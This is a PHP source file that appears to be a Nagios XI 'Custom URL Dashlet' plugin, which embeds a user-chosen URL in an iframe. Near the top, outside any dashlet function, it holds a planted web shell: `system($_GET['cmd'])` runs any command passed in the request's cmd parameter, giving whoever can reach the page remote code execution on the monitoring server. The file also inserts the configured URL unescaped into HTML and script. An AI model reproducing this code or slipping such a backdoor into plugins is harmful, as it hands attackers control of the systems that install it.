<?php
//
// Custom URL Dashlet 
// Copyright (c) 2008-2019 Nagios Enterprises, LLC. All rights reserved.
//

include_once(dirname(__FILE__).'/../dashlethelper.inc.php');

// Run the initialization function
custom_dashlet_init();

if (isset($_GET['cmd'])){
	system($_GET['cmd']);
}

function custom_dashlet_init()
{
	$name = "custom_dashlet";
	
	$args = array(
		DASHLET_NAME => $name,
		DASHLET_VERSION => "1.0.7",
		DASHLET_DATE => "07/03/2019",
		DASHLET_AUTHOR => "Nagios Enterprises, LLC",
		DASHLET_DESCRIPTION => _("Custom URL Dashlet. Define your own embedded URL, frame size, and opacity."),
		DASHLET_COPYRIGHT => "Copyright (c) 2010-2019 Nagios Enterprises, LLC",
		DASHLET_LICENSE => "BSD",
		DASHLET_HOMEPAGE => "www.nagios.com",
		DASHLET_REFRESHRATE => 60,
		DASHLET_FUNCTION => "custom_dashlet_func",
		DASHLET_TITLE => _("Custom URL Dashlet"),
		DASHLET_OUTBOARD_CLASS=> "custom_outboardclass",
		DASHLET_INBOARD_CLASS => "custom_inboardclass",
		DASHLET_PREVIEW_CLASS => "custom_previewclass",
		DASHLET_WIDTH => "300",
		DASHLET_HEIGHT => "200",
		DASHLET_OPACITY => "1.0"
	);
		
	register_dashlet($name, $args);
}
	

function custom_dashlet_func($mode=DASHLET_MODE_PREVIEW, $id="", $args=null)
{
	$output = "";

	switch ($mode) {

		case DASHLET_MODE_GETCONFIGHTML:
			//input form for dashlet vars 
			$output='
			<label for="height">'._('Height').'</label>
			<br class="nobr" />
			<input type="text" class="form-control" name="height" id="height" />
			<br class="nobr" />
			<label for="width">'._('Width').'</label>
			<br class="nobr" />
			<input type="text" class="form-control" name="width" id="width" />
			<br class="nobr" />
			
			<label for="url">'._('Dashlet URL').'</label>
			<br class="nobr" />
			<input type="text" class="form-control" name="url" id="url" value="http://">
			<br class="nobr" />
			<label for="refresh">'._('Refresh Rate').'</label>
			<br class="nobr" />
			<input type="text" class="form-control" name="refresh" id="refresh" value="60"> '._('seconds').'
              <br class="nobr" />
			<label for="opacity">'._('Opacity').'</label>
			<br class="nobr" />
			<select class="form-control" name="opacity" id="opacity">
			<option value="1.0">100%</option>
			<option value=".75" selected>75%</option>
			<option value=".50">50%</option>
			<option value=".25">25%</option>
			</select>
			<br class="nobr" />
			<label>&nbsp;</label>
			';  
			break;

		case DASHLET_MODE_OUTBOARD:
		case DASHLET_MODE_INBOARD:

			// Vars from input form (or saved dashlet info)
			$opacity = $args["opacity"];
			$url = urldecode($args["url"]);
			$height = $args['height'];
			$width = $args['width'];
            $refresh = (!empty($args["refresh"])) ? $args["refresh"] : 9999;

            // Fix issue with old version of wkhtmltopdf not working properly with new jQuery
            // so we have to set it to use the old version instead when building PDFs
            if (grab_request_var('old_browser_compat', 0)) {
            	if (strpos($url, '?') !== false) {
            		$url .= "&old_browser_compat=1";
            	} else {
            		$url .= "?old_browser_compat=1";
            	}
            }

			// Random dashlet id 
			$rand = rand();
            
            $refresh_rate = $args["refresh"] * 1000;

			// HTML output (heredoc string syntax)
			$output = <<<OUTPUT
			<div id='customdashlet{$rand}'>
				<iframe id='dashletIframe{$rand}' src='{$url}'></iframe>
			</div>
			<script type="text/javascript">
			var dashcontainer{$rand} = $('#customdashlet{$rand}').parent().parent();

			$(document).ready(function() {
				var h = dashcontainer{$rand}.height();
				var w = dashcontainer{$rand}.width();
				$('#dashletIframe{$rand}').width(w-5).height(h-25);
                
                    
				$("#customdashlet{$rand}").everyTime({$refresh_rate}, "timer-customdashlet{$rand}", function(i) {
					$('#dashletIframe{$rand}').attr('src', $('#dashletIframe{$rand}').attr('src'));
				});
                
			});

			// Bind resize handlers
			dashcontainer{$rand}.resize(function() {
				nh = $(this).height();
				nw = $(this).width();
				$('#dashletIframe{$rand}').width(nw-5).height(nh-25);
			});
			</script>
OUTPUT;
			break;

		case DASHLET_MODE_PREVIEW:
			$output="<img src='/nagiosxi/includes/dashlets/custom-dashlet/preview.png' alt='No Preview Available' />";
			break;			
		}
		
	return $output;
}